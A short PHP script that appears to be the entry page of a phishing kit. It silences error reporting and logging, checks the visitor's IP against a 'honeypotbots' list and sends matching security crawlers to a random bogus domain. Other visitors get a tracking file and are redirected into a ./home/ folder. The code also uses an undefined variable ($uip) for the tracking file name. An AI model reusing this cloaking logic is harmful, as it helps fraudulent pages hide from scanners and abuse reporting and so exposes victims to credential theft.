<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('./home/honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  
    header('Location: http://www.' . base64_encode(rand(1,999999999)) . '.com');
	  
     exit();

}


$fp = fopen('./home/users/'. $uip .'.txt', 'wb');
	        fwrite($fp, '');
            fclose($fp);

?>

<!doctype html>

<html>
<body>
<META HTTP-EQUIV='Refresh' Content=0;URL='./home/'>
 
</body>

</html>
